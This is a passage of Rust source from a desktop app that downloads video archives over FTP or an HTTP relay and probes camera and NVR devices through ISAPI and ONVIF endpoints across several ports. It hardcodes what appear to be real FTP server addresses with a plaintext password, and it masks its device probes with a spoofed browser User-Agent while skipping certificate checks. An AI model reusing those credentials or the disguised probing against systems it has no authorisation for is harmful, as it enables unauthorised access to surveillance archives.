    if !host_candidates.iter().any(|(h, _)| h == rtsp_host) {
        host_candidates.push((rtsp_host.to_string(), parsed.port()));
    }

    let mut candidate_ports: Vec<u16> = Vec::new();
    candidate_ports.push(match rtsp_port {
        554 => 80,
        p => p,
    });
    if !candidate_ports.contains(&2019) {
        candidate_ports.push(2019);
    }
    if !candidate_ports.contains(&80) {
        candidate_ports.push(80);
    }
    if !candidate_ports.contains(&443) {
        candidate_ports.push(443);
    }

    let mut out = Vec::new();
    for (host, hinted_port) in host_candidates {
        let mut ports_for_host: Vec<u16> = Vec::new();
        if let Some(port) = hinted_port {
            ports_for_host.push(port);
        }
        for p in &candidate_ports {
            if !ports_for_host.contains(p) {
                ports_for_host.push(*p);
            }
        }

        for p in ports_for_host {
            let scheme = if p == 443 || parsed.scheme() == "rtsps" {
                "https"
            } else {
                "http"
            };
            out.push(format!(
                "{}://{}:{}/ISAPI/ContentMgmt/download?playbackURI={}",
                scheme,
                host,
                p,
                urlencoding::encode(playback_uri)
            ));
        }
    }
    out
}

fn resolve_ftp_config(server_alias: &str) -> Result<FtpConfig, String> {
    match server_alias {
        "video1" => Ok(FtpConfig {
            host: "93.125.48.66:21",
            user: "mvd",
            pass: "gpfZrw%9RVqp",
        }),
        "video2" => Ok(FtpConfig {
            host: "93.125.48.100:21",
            user: "mvd",
            pass: "gpfZrw%9RVqp",
        }),
        _ => Err(format!("Неизвестный сервер: {}", server_alias)),
    }
}

// =============================================================================
// RELAY: FTP через HTTP-прокси на ПК 2
// =============================================================================

/// Получить список файлов через relay
#[tauri::command]
async fn relay_list_files(
    relay_url: String,
    relay_token: Option<String>,
    server_alias: String,
    folder_path: Option<String>,
    log_state: State<'_, LogState>,
) -> Result<Vec<FtpFolder>, String> {
    let path = folder_path.unwrap_or_else(|| "/".to_string());
    push_runtime_log(&log_state, format!("RELAY list: {} {}", server_alias, path));

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .map_err(|e| e.to_string())?;

    let url = format!(
        "{}/api/list?server={}&path={}",
        relay_url.trim_end_matches('/'),
        urlencoding::encode(&server_alias),
        urlencoding::encode(&path)
    );

    let mut req = client.get(&url);
    if let Some(ref token) = relay_token {
        req = req.header("Authorization", format!("Bearer {}", token));
    }

    let resp = req
        .send()
        .await
        .map_err(|e| format!("Relay connection error: {}", e))?;

    if !resp.status().is_success() {
        let status = resp.status();
        let body = resp.text().await.unwrap_or_default();
        return Err(format!("Relay error HTTP {}: {}", status, body));
    }

    let items: Vec<FtpFolder> = resp.json().await.map_err(|e| e.to_string())?;
    push_runtime_log(
        &log_state,
        format!("RELAY list done: {} items", items.len()),
    );
    Ok(items)
}

/// Скачать файл через relay и сохранить локально
#[tauri::command]
async fn relay_download_file(
    relay_url: String,
    relay_token: Option<String>,
    server_alias: String,
    folder_path: String,
    filename: String,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    let task_key = task_id
        .unwrap_or_else(|| format!("relay_{}_{}", server_alias, Utc::now().timestamp_millis()));
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    push_runtime_log(
        &log_state,
        format!(
            "RELAY download: {}/{}/{} [task:{}]",
            server_alias, folder_path, filename, task_key
        ),
    );

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(600)) // 10 мин на большие файлы
        .build()
        .map_err(|e| e.to_string())?;

    let url = format!(
        "{}/api/download?server={}&path={}&filename={}",
        relay_url.trim_end_matches('/'),
        urlencoding::encode(&server_alias),
        urlencoding::encode(&folder_path),
        urlencoding::encode(&filename)
    );

    let mut req = client.get(&url);
    if let Some(ref token) = relay_token {
        req = req.header("Authorization", format!("Bearer {}", token));
    }

    let started = std::time::Instant::now();
    let resp = req
        .send()
        .await
        .map_err(|e| format!("Relay connection error: {}", e))?;

    if !resp.status().is_success() {
        let body = resp.text().await.unwrap_or_default();
        return Err(format!("Relay download error: {}", body));
    }

    let total_size = resp.content_length().unwrap_or(0);
    let safe_name = sanitize_filename_component(&filename);
    let path =
        get_vault_path()
            .join("archives")
            .join(&server_alias)
            .join(if safe_name.is_empty() {
                "download.mkv"
            } else {
                &safe_name
            });
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let mut stream = resp.bytes_stream();
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open(&path)
        .map_err(|e| e.to_string())?;

    let mut bytes_written: u64 = 0;
    let progress_step = 2 * 1024 * 1024u64;
    let mut next_mark = progress_step;

    while let Some(chunk) = stream.next().await {
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|s| s.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = std::fs::remove_file(&path);
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
            );
            return Err(format!("Relay download cancelled [task:{}]", task_key));
        }

        let data = chunk.map_err(|e| e.to_string())?;
        std::io::Write::write_all(&mut file, &data).map_err(|e| e.to_string())?;
        bytes_written += data.len() as u64;

        if bytes_written >= next_mark {
            push_runtime_log(
                &log_state,
                format!(
                    "DOWNLOAD_PROGRESS|{}|{}|{}",
                    task_key,
                    bytes_written,
                    total_size.max(bytes_written)
                ),
            );
            next_mark += progress_step;
        }
    }

    let duration_ms = started.elapsed().as_millis();
    push_runtime_log(
        &log_state,
        format!(
            "RELAY download done: {} ({} bytes, {}ms) [task:{}]",
            filename, bytes_written, duration_ms, task_key
        ),
    );

    Ok(DownloadReport {
        server_alias: server_alias.to_string(),
        filename: safe_name,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes: total_size.max(bytes_written),
        duration_ms,
        resumed: false,
        skipped_as_complete: false,
    })
}

/// Проверить что relay доступен
#[tauri::command]
async fn relay_ping(relay_url: String, relay_token: Option<String>) -> Result<Value, String> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .map_err(|e| e.to_string())?;

    let url = format!("{}/api/ping", relay_url.trim_end_matches('/'));
    let mut req = client.get(&url);
    if let Some(ref token) = relay_token {
        req = req.header("Authorization", format!("Bearer {}", token));
    }

    let resp = req
        .send()
        .await
        .map_err(|e| format!("Relay недоступен: {}", e))?;
    let data: Value = resp.json().await.map_err(|e| e.to_string())?;
    Ok(data)
}

fn resolve_socket_addrs(host: &str) -> Result<Vec<std::net::SocketAddr>, String> {
    host.to_socket_addrs()
        .map(|iter| iter.collect::<Vec<_>>())
        .map_err(|e| format!("Не удалось резолвить FTP хост {}: {}", host, e))
        .and_then(|addrs| {
            if addrs.is_empty() {
                Err(format!("FTP хост {} не вернул ни одного адреса", host))
            } else {
                Ok(addrs)
            }
        })
}

fn ftp_banner_probe(host: &str, attempts: usize) -> Result<String, String> {
    let mut last_err = String::from("FTP preflight не выполнился");

    let addrs = resolve_socket_addrs(host).ok();

    for attempt in 1..=attempts {
        println!(
            "[FTP PREFLIGHT] попытка {}/{} -> {}",
            attempt, attempts, host
        );

        let mut connected = false;

        if let Some(addrs) = &addrs {
            for connect_addr in addrs {
                match std::net::TcpStream::connect_timeout(
                    connect_addr,
                    std::time::Duration::from_secs(3),
                ) {
                    Ok(mut stream) => {
                        connected = true;
                        let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(5)));
                        let _ = stream.set_write_timeout(Some(std::time::Duration::from_secs(5)));

                        let mut buf = [0u8; 512];
                        match std::io::Read::read(&mut stream, &mut buf) {
                            Ok(n) if n > 0 => {
                                let banner = String::from_utf8_lossy(&buf[..n]).trim().to_string();
                                println!("[FTP PREFLIGHT] banner: {}", banner);
                                return Ok(banner);
                            }
                            Ok(_) => {
                                let _ = std::io::Write::write_all(&mut stream, b"NOOP\r\n");
                                match std::io::Read::read(&mut stream, &mut buf) {
                                    Ok(n2) if n2 > 0 => {
                                        let banner =
                                            String::from_utf8_lossy(&buf[..n2]).trim().to_string();
                                        println!("[FTP PREFLIGHT] late banner: {}", banner);
                                        return Ok(banner);
                                    }
                                    _ => {
                                        last_err =
                                            format!("Пустой ответ баннера FTP от {}", connect_addr);
                                    }
                                }
                            }
                            Err(e) => {
                                last_err =
                                    format!("Ошибка чтения баннера FTP от {}: {}", connect_addr, e);
                            }
                        }
                    }
                    Err(e) => {
                        last_err = format!("Ошибка TCP подключения к FTP {}: {}", connect_addr, e);
                    }
                }
            }
        }

        if !connected {
            match std::net::TcpStream::connect(host) {
                Ok(mut stream) => {
                    let _ = stream.set_read_timeout(Some(std::time::Duration::from_secs(5)));
                    let _ = stream.set_write_timeout(Some(std::time::Duration::from_secs(5)));
                    let mut buf = [0u8; 512];
                    match std::io::Read::read(&mut stream, &mut buf) {
                        Ok(n) if n > 0 => {
                            let banner = String::from_utf8_lossy(&buf[..n]).trim().to_string();
                            println!("[FTP PREFLIGHT] direct banner: {}", banner);
                            return Ok(banner);
                        }
                        _ => {
                            last_err = format!("Пустой/невалидный прямой banner для {}", host);
                        }
                    }
                }
                Err(e) => {
                    last_err = format!("Ошибка прямого TCP подключения к FTP {}: {}", host, e);
                }
            }
        }

        std::thread::sleep(std::time::Duration::from_millis(350));
    }

    Err(if last_err.is_empty() {
        "FTP список недоступен".into()
    } else {
        last_err
    })
}

fn ftp_connect_with_retry(
    host: &str,
    user: &str,
    pass: &str,
    max_retries: usize,
) -> Result<suppaftp::FtpStream, String> {
    let mut delay_ms: u64 = 2000; // Стартуем с 2 секунд
    let mut last_err = String::new();

    for attempt in 1..=max_retries {
        println!(
            "[FTP ЦМУС] Попытка {}/{} -> {} (Ожидание: {}ms)",
            attempt, max_retries, host, delay_ms
        );

        match suppaftp::FtpStream::connect(host) {
            Ok(mut ftp) => {
                match ftp.login(user, pass.trim()) {
                    Ok(_) => return Ok(ftp),
                    Err(e) => {
                        last_err = format!("Ошибка авторизации: {}", e);
                        // Ошибка кредов критична, обрываем попытки
                        return Err(last_err);
                    }
                }
            }
            Err(e) => {
                last_err = format!("Ошибка TCP: {}", e);
                println!(
                    "[FTP ЦМУС] Сбой: {}. Переподключение через {}ms",
                    e, delay_ms
                );
                // Засыпаем и увеличиваем время ожидания в 2 раза (2s, 4s, 8s)
                std::thread::sleep(std::time::Duration::from_millis(delay_ms));
                delay_ms *= 2;
            }
        }
    }
    Err(format!(
        "Превышен лимит попыток. Последняя ошибка: {}",
        last_err
    ))
}

fn ftp_nlst_root_with_fallback(ftp: &mut FtpStream) -> Result<Vec<String>, String> {
    let mut errors: Vec<String> = Vec::new();

    for candidate in [Some("/"), Some("."), None] {
        match ftp.nlst(candidate) {
            Ok(items) if !items.is_empty() => return Ok(items),
            Ok(_) => {
                errors.push(format!("FTP nlst вернул пустой список для {:?}", candidate));
            }
            Err(e) => {
                errors.push(format!("FTP nlst ошибка для {:?}: {}", candidate, e));
            }
        }
    }

    match ftp.list(Some("/")) {
        Ok(lines) if !lines.is_empty() => {
            let mut items = Vec::new();
            for line in lines {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                let name = trimmed
                    .split_whitespace()
                    .last()
                    .map(|s| s.trim().trim_start_matches('/').to_string())
                    .unwrap_or_default();
                if !name.is_empty() {
                    items.push(name);
                }
            }
            if !items.is_empty() {
                return Ok(items);
            }
            errors.push("FTP list fallback вернул пустой список".into());
        }
        Ok(_) => {
            errors.push("FTP list fallback вернул пустой ответ".into());
        }
        Err(e) => {
            errors.push(format!("FTP list fallback ошибка: {}", e));
        }
    }

    Err(if errors.is_empty() {
        "FTP список недоступен".into()
    } else {
        errors.join(" || ")
    })
}

#[tauri::command]
fn get_ftp_folders(
    server_alias: &str,
    folder_path: Option<String>,
    log_state: State<'_, LogState>,
) -> Result<Vec<FtpFolder>, String> {
    push_runtime_log(
        &log_state,
        format!("FTP list requested for server {}", server_alias),
    );

    let cfg = resolve_ftp_config(server_alias)?;

    // 1. Подключаемся через нашу новую функцию с бэкоффом
    let mut ftp = ftp_connect_with_retry(cfg.host, cfg.user, cfg.pass, 3)?;

    let current_path = folder_path.unwrap_or_else(|| "/".to_string());
    if current_path != "/" && !current_path.is_empty() {
        if let Err(e) = ftp.cwd(&current_path) {
            push_runtime_log(
                &log_state,
                format!("FTP cwd failed to {}: {}", current_path, e),
            );
        }
    }

    // 2. Интеллектуальное переключение режимов
    // Попытка 1: Пассивный режим
    ftp.set_mode(suppaftp::Mode::Passive);
    push_runtime_log(
        &log_state,
        "Пробуем Пассивный (Passive) режим...".to_string(),
    );

    let list = match ftp_nlst_root_with_fallback(&mut ftp) {
        Ok(items) => {
            push_runtime_log(&log_state, "Пассивный режим сработал!".to_string());
            items
        }
        Err(e) => {
            push_runtime_log(
                &log_state,
                format!("Пассивный режим заблокирован: {}. Пробуем Active...", e),
            );

            // Попытка 2: Активный режим (Fallback)
            ftp.set_mode(suppaftp::Mode::Active);

            match ftp_nlst_root_with_fallback(&mut ftp) {
                Ok(items) => {
                    push_runtime_log(
                        &log_state,
                        "Активный режим успешно пробил файрвол!".to_string(),
                    );
                    items
                }
                Err(e_act) => {
                    return Err(format!(
                        "Оба режима отклонены сервером. Passive: {}, Active: {}",
                        e, e_act
                    ));
                }
            }
        }
    };
    let mut folders = Vec::new();

    for item in list {
        let name = item.trim_start_matches('/').to_string();
        if name == "." || name == ".." || name.is_empty() {
            continue;
        }

        let is_file =
            name.contains('.') && name.rfind('.').unwrap_or(0) > name.len().saturating_sub(6);
        let full_path = if current_path.ends_with('/') {
            format!("{}{}", current_path, name)
        } else {
            format!("{}/{}", current_path, name)
        };

        folders.push(FtpFolder {
            name,
            path: full_path,
            is_file,
        });
    }

    let _ = ftp.quit();
    push_runtime_log(
        &log_state,
        format!("FTP list completed ({} entries)", folders.len()),
    );
    Ok(folders)
}

#[tauri::command]
fn download_ftp_file(
    server_alias: &str,
    folder_path: String,
    filename: String,
    resume_if_exists: Option<bool>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
) -> Result<DownloadReport, String> {
    let task_key = task_id.unwrap_or_else(|| {
        format!(
            "{}_{}_{}",
            server_alias,
            filename,
            Utc::now().timestamp_millis()
        )
    });
    push_runtime_log(
        &log_state,
        format!(
            "FTP download requested: {} from {} [task:{}]",
            filename, server_alias, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    let cfg = resolve_ftp_config(server_alias)?;

    let _banner = ftp_banner_probe(cfg.host, 3)?;
    let mut ftp = ftp_connect_with_retry(cfg.host, cfg.user, cfg.pass, 3)?;

    let normalized_folder = folder_path.trim().trim_matches('/').to_string();
    let mut retr_candidates = vec![filename.clone()];
    if !normalized_folder.is_empty() {
        retr_candidates.push(format!("{}/{}", normalized_folder, filename));
        retr_candidates.push(format!("/{}/{}", normalized_folder, filename));
        retr_candidates.push(format!("./{}/{}", normalized_folder, filename));
    }
    retr_candidates.sort();
    retr_candidates.dedup();

    if folder_path != "/" && !folder_path.is_empty() {
        if let Err(e) = ftp.cwd(&folder_path) {
            push_runtime_log(
                &log_state,
                format!(
                    "FTP cwd failed for '{}' ({}), switching to low-level RETR path fallbacks",
                    folder_path, e
                ),
            );
        }
    }

    let path = get_vault_path()
        .join("archives")
        .join(server_alias)
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());

    let resume = resume_if_exists.unwrap_or(true);
    let local_size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
    let mut remote_size = 0u64;
    for candidate in &retr_candidates {
        if let Ok(sz) = ftp.size(candidate) {
            remote_size = sz as u64;
            break;
        }
    }

    if resume && local_size > 0 && remote_size > 0 && local_size >= remote_size {
        push_runtime_log(
            &log_state,
            format!(
                "FTP skip: {} already complete ({} bytes)",
                filename, local_size
            ),
        );

        let _ = ftp.quit();
        return Ok(DownloadReport {
            server_alias: server_alias.to_string(),
            filename,
            save_path: path.to_string_lossy().to_string(),
            bytes_written: 0,
            total_bytes: local_size,
            duration_ms: 0,
            resumed: false,
            skipped_as_complete: true,
        });
    }

    let started = std::time::Instant::now();
    let mut resumed = false;

    if resume && local_size > 0 {
        if ftp.resume_transfer(local_size as usize).is_ok() {
            resumed = true;
            push_runtime_log(
                &log_state,
                format!(
                    "FTP resume enabled for {} from offset {}",
                    filename, local_size
                ),
            );
        } else {
            push_runtime_log(
                &log_state,
                format!(
                    "FTP resume rejected for {}, fallback to full download",
                    filename
                ),
            );
        }
    }

    let mut retr_path_used = String::new();
    let mut last_retr_err = String::new();
    let mut data_stream_opt = None;
    for candidate in &retr_candidates {
        match ftp.retr_as_stream(candidate) {
            Ok(stream) => {
                retr_path_used = candidate.clone();
                data_stream_opt = Some(stream);
                break;
            }
            Err(e) => {
                last_retr_err = format!("{} => {}", candidate, e);
            }
        }
    }

    let mut resumed_downgraded = false;
    if data_stream_opt.is_none() && resumed {
        push_runtime_log(
            &log_state,
            format!(
                "FTP resume stream setup failed for {} ({}), reconnecting without resume",
                filename, last_retr_err
            ),
        );
        let _ = ftp.quit();
        ftp = ftp_connect_with_retry(cfg.host, cfg.user, cfg.pass, 2)?;
        if folder_path != "/" && !folder_path.is_empty() {
            let _ = ftp.cwd(&folder_path);
        }

        for candidate in &retr_candidates {
            match ftp.retr_as_stream(candidate) {
                Ok(stream) => {
                    retr_path_used = candidate.clone();
                    data_stream_opt = Some(stream);
                    resumed_downgraded = true;
                    break;
                }
                Err(e) => {
                    last_retr_err = format!("{} => {}", candidate, e);
                }
            }
        }
    }

    let mut data_stream = data_stream_opt
        .ok_or_else(|| format!("FTP RETR failed for all path candidates: {}", last_retr_err))?;

    if resumed_downgraded {
        resumed = false;
        push_runtime_log(
            &log_state,
            format!(
                "FTP resume degraded to full download for {} (path: {})",
                filename, retr_path_used
            ),
        );
    }

    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(!resumed)
        .append(resumed)
        .open(&path)
        .map_err(|e| e.to_string())?;

    let mut bytes_written: u64 = 0;
    let mut chunk = [0u8; 64 * 1024];
    let progress_step = 2 * 1024 * 1024u64;
    let mut next_progress_mark = progress_step;

    loop {
        let n = std::io::Read::read(&mut data_stream, &mut chunk).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|set| set.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = ftp.quit();
            if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
                cancelled.remove(&task_key);
            }
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
            );
            return Err(format!(
                "Загрузка отменена пользователем [task:{}]",
                task_key
            ));
        }

        std::io::Write::write_all(&mut file, &chunk[..n]).map_err(|e| e.to_string())?;
        bytes_written += n as u64;

        let current_total = local_size + bytes_written;
        if current_total >= next_progress_mark {
            push_runtime_log(
                &log_state,
                format!(
                    "DOWNLOAD_PROGRESS|{}|{}|{}",
                    task_key,
                    current_total,
                    remote_size.max(current_total)
                ),
            );
            next_progress_mark += progress_step;
        }
    }

    if let Err(e) = ftp.finalize_retr_stream(data_stream) {
        let msg = e.to_string();
        let soft_ok = msg.contains("226") || msg.contains("425") || msg.contains("timed out");
        if soft_ok {
            push_runtime_log(
                &log_state,
                format!("FTP finalize warning ignored for {}: {}", filename, msg),
            );
        } else {
            return Err(msg);
        }
    }

    let _ = ftp.quit();
    let duration_ms = started.elapsed().as_millis();
    let total_bytes = if resumed {
        local_size + bytes_written
    } else {
        bytes_written
    };

    push_runtime_log(
        &log_state,
        format!(
            "FTP download finished: {} from {} via {} (written {} bytes, total {} bytes, {} ms) [task:{}]",
            filename, server_alias, retr_path_used, bytes_written, total_bytes, duration_ms, task_key
        ),
    );

    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    Ok(DownloadReport {
        server_alias: server_alias.to_string(),
        filename,
        save_path: path.to_string_lossy().to_string(),
        bytes_written,
        total_bytes,
        duration_ms,
        resumed,
        skipped_as_complete: false,
    })
}

fn cancel_download_task(
    task_id: String,
    cancel_state: State<'_, DownloadCancelState>,
    log_state: State<'_, LogState>,
) -> Result<String, String> {
    let mut cancelled = cancel_state
        .cancelled_tasks
        .lock()
        .map_err(|_| "Failed to access cancel state".to_string())?;
    cancelled.insert(task_id.clone());
    push_runtime_log(
        &log_state,
        format!("Download cancel requested [task:{}]", task_id),
    );
    Ok("cancel_requested".into())
}

#[tauri::command]
fn get_runtime_logs(
    limit: Option<usize>,
    state: State<'_, LogState>,
    nexus_bridge: State<'_, NexusLogBridge>,
) -> Result<Vec<String>, String> {
    let limit = limit.unwrap_or(100).min(500);

    // Объединяем основные логи с nexus логами
    let mut all_logs: Vec<String> = Vec::new();

    if let Ok(logs) = state.lines.lock() {
        all_logs.extend(logs.iter().cloned());
    }
    if let Ok(nlogs) = nexus_bridge.lines.lock() {
        all_logs.extend(nlogs.iter().cloned());
    }

    all_logs.sort();

    let start = all_logs.len().saturating_sub(limit);
    Ok(all_logs[start..].to_vec())
}

#[tauri::command]
async fn videodvor_login(
    username: String,
    password: String,
    state: tauri::State<'_, VideodvorState>,
) -> Result<String, String> {
    let mut scanner = state.scanner.lock().await;
    scanner.login(&username, &password).await?;
    Ok("Logged in".into())
}

#[tauri::command]
async fn videodvor_scrape(
    state: tauri::State<'_, VideodvorState>,
) -> Result<Vec<serde_json::Value>, String> {
    let scanner = state.scanner.lock().await;
    scanner.scrape_all_cameras().await
}

#[tauri::command]
async fn videodvor_list_archive(
    ip: String,
    state: tauri::State<'_, VideodvorState>,
) -> Result<Vec<String>, String> {
    let scanner = state.scanner.lock().await;
    scanner.get_archive_files(&ip).await
}

#[tauri::command]
async fn videodvor_download_file(
    ip: String,
    filename: String,
    state: tauri::State<'_, VideodvorState>,
) -> Result<String, String> {
    let scanner = state.scanner.lock().await;
    scanner.download_file(&ip, &filename).await?;
    Ok("Download started".into())
}

// --- ФУНКЦИИ ДЛЯ СОВМЕСТИМОСТИ С videodvor_scanner.rs ---

pub fn scan_ftp_archive(
    ip: String,
    ftp_host: String,
    ftp_user: String,
    ftp_pass: String,
) -> Result<Vec<String>, String> {
    let host = format!("{}:21", ftp_host);
    let _ = ftp_banner_probe(&host, 2);
    let mut ftp = ftp_connect_with_retry(&host, &ftp_user, &ftp_pass, 2)?;

    if ip != "/" && !ip.is_empty() {
        let _ = ftp.cwd(&ip);
    }
    let list = ftp_nlst_root_with_fallback(&mut ftp)?;
    let _ = ftp.quit();
    Ok(list)
}

pub fn download_ftp_scanner(
    ip: String,
    filename: String,
    ftp_host: String,
    ftp_user: String,
    ftp_pass: String,
) -> Result<String, String> {
    let host = format!("{}:21", ftp_host);
    let _ = ftp_banner_probe(&host, 2);
    let mut ftp = ftp_connect_with_retry(&host, &ftp_user, &ftp_pass, 2)?;

    let _ = ftp.cwd(&ip);
    let data = ftp.retr_as_buffer(&filename).map_err(|e| e.to_string())?;

    // Путь сохранения для сканера
    let path = get_vault_path().join("archives").join(&ip).join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());
    std::fs::write(&path, data.into_inner()).map_err(|e| e.to_string())?;

    let _ = ftp.quit();
    Ok("Ok".into())
}

#[tauri::command]
async fn probe_nvr_protocols(
    host: String,
    login: String,
    pass: String,
    log_state: State<'_, LogState>,
) -> Result<Vec<ProtocolProbeResult>, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для проверки протоколов".into());
    }

    push_runtime_log(
        &log_state,
        format!("Protocol probe started for {}", clean_host),
    );

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(6))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36") // <-- МАСКИРОВКА
        .build()
        .map_err(|e| e.to_string())?;

    let mut out = Vec::new();

    let onvif_endpoints = vec![
        format!("http://{}:80/onvif/device_service", clean_host),
        format!("http://{}:8080/onvif/device_service", clean_host),
        format!("https://{}:443/onvif/device_service", clean_host),
        format!("https://{}:8443/onvif/device_service", clean_host),
    ];

    for endpoint in onvif_endpoints {
        let status = match client.get(&endpoint).send().await {
            Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 401 => "detected",
            Ok(_) => "not_detected",
            Err(_) => "unreachable",
        };
        out.push(ProtocolProbeResult {
            protocol: "ONVIF".into(),
            endpoint,
            status: status.into(),
        });
    }

    let isapi_endpoints = vec![
        format!("http://{}:80/ISAPI/System/deviceInfo", clean_host),
        format!("http://{}:8080/ISAPI/System/deviceInfo", clean_host),
        format!("https://{}:443/ISAPI/System/deviceInfo", clean_host),
        format!("https://{}:8443/ISAPI/System/deviceInfo", clean_host),
    ];

    for endpoint in isapi_endpoints {
        let status = match client
            .get(&endpoint)
            .basic_auth(login.clone(), Some(pass.clone()))
            .send()
            .await
        {
            Ok(resp) if resp.status().is_success() || resp.status().as_u16() == 401 => "detected",
            Ok(_) => "not_detected",
            Err(_) => "unreachable",
        };
        out.push(ProtocolProbeResult {
            protocol: "ISAPI".into(),
            endpoint,
            status: status.into(),
        });
    }

    let detected = out.iter().filter(|x| x.status == "detected").count();
    push_runtime_log(
        &log_state,
        format!(
            "Protocol probe finished for {} (detected: {})",
            clean_host, detected
        ),
    );
    Ok(out)
}

#[tauri::command]
async fn fetch_nvr_device_info(
    host: String,
    login: String,
    pass: String,
    log_state: State<'_, LogState>,
) -> Result<NvrDeviceInfoResult, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для ISAPI deviceInfo".into());
    }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36") // <-- МАСКИРОВКА
        .build()
        .map_err(|e| e.to_string())?;

    let candidates = vec![
        format!("http://{}:2019/ISAPI/System/deviceInfo", clean_host),
        format!("http://{}:80/ISAPI/System/deviceInfo", clean_host),
        format!("http://{}:8080/ISAPI/System/deviceInfo", clean_host),
        format!("https://{}:443/ISAPI/System/deviceInfo", clean_host),
        format!("https://{}:8443/ISAPI/System/deviceInfo", clean_host),
    ];

    push_runtime_log(
        &log_state,
        format!("ISAPI deviceInfo fetch started for {}", clean_host),
    );

    for endpoint in candidates {
        let is_2019 = endpoint.contains(":2019");

        // Первый запрос — получаем challenge (для Digest) или ответ (для Basic)
        let resp = if is_2019 {
            // Порт 2019: IE-style headers, без auth — получим 401 + WWW-Authenticate
            client
                .get(&endpoint)
                .header("X-Requested-With", "XMLHttpRequest")
                .header(
                    "User-Agent",
                    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
                )
                .header("Accept", "application/xml, text/xml, */*")
                .send()
                .await
        } else {
            client
                .get(&endpoint)
                .basic_auth(login.clone(), Some(pass.clone()))
                .send()
                .await
        };

        match resp {
            Ok(r) => {
                let status_code = r.status().as_u16();

                // Если 401 на порту 2019 — делаем Digest auth.
                // Даже если digest не дал 200, сам факт 401 означает, что endpoint живой.
                if status_code == 401 && is_2019 {
                    let www_auth = r
                        .headers()
                        .get(reqwest::header::WWW_AUTHENTICATE)
                        .and_then(|h| h.to_str().ok())
                        .map(|s| s.to_string());
                    let first_body = r.text().await.unwrap_or_default();
                    if let Some(www_auth) = www_auth {
                        let path = "/ISAPI/System/deviceInfo";
                        if let Ok(mut prompt) = digest_auth::parse(&www_auth) {
                            let ctx =
                                digest_auth::AuthContext::new(login.clone(), pass.clone(), path);
                            if let Ok(answer) = prompt.respond(&ctx) {
                                let resp2 = client
                                    .get(&endpoint)
                                    .header("Authorization", answer.to_string())
                                    .header("X-Requested-With", "XMLHttpRequest")
                                    .header("User-Agent", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)")
                                    .send()
                                    .await;
                                if let Ok(r2) = resp2 {
                                    let sc2 = r2.status().as_u16();
                                    let text2 = r2.text().await.unwrap_or_default();
                                    let preview = text2.chars().take(600).collect::<String>();
                                    push_runtime_log(
                                        &log_state,
                                        format!(
                                            "ISAPI deviceInfo (Digest) {} from {}",
                                            sc2, endpoint
                                        ),
                                    );
                                    if sc2 == 200 || sc2 == 401 || sc2 == 403 {
                                        return Ok(NvrDeviceInfoResult {
                                            endpoint,
                                            status: sc2.to_string(),
                                            body_preview: preview,
                                        });
                                    }
                                }
                            }
                        }
                    }

                    let preview = first_body.chars().take(600).collect::<String>();
                    push_runtime_log(
                        &log_state,
                        format!(
                            "ISAPI deviceInfo response {} from {}",
                            status_code, endpoint
                        ),
                    );
                    return Ok(NvrDeviceInfoResult {
                        endpoint,
                        status: status_code.to_string(),
                        body_preview: preview,
                    });
                }

                let text = r.text().await.unwrap_or_default();
                if status_code == 200 || status_code == 401 {
                    let preview = text.chars().take(600).collect::<String>();
                    push_runtime_log(
                        &log_state,
                        format!(
                            "ISAPI deviceInfo response {} from {}",
                            status_code, endpoint
                        ),
                    );
                    return Ok(NvrDeviceInfoResult {
                        endpoint,
                        status: status_code.to_string(),
                        body_preview: preview,
                    });
                }
            }
            Err(_) => {}
        }
    }

    push_runtime_log(
        &log_state,
        format!("ISAPI deviceInfo unavailable for {}", clean_host),
    );

    Err("ISAPI deviceInfo endpoint не найден или недоступен".into())
}

#[tauri::command]
async fn fetch_onvif_device_info(
    host: String,
    login: String,
    pass: String,
    log_state: State<'_, LogState>,
) -> Result<NvrDeviceInfoResult, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для ONVIF device info".into());
    }

